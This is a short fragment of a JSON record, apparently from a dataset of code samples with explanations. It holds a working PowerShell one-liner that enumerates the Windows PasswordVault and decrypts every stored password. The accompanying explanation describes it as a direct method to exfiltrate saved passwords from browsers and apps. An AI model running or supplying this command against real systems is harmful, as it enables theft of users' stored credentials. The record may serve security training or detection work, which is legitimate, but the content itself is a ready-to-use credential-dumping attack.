      "code": "[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }",
      "code_explain": "The script loads the Windows Runtime type for PasswordVault, creates an instance, calls RetrieveAll() to enumerate all stored credentials, then for each credential it calls RetrievePassword() to decrypt the password and outputs the credential object. This is a direct method to exfiltrate saved passwords from Windows (e.g., Internet Explorer, Edge, apps).",
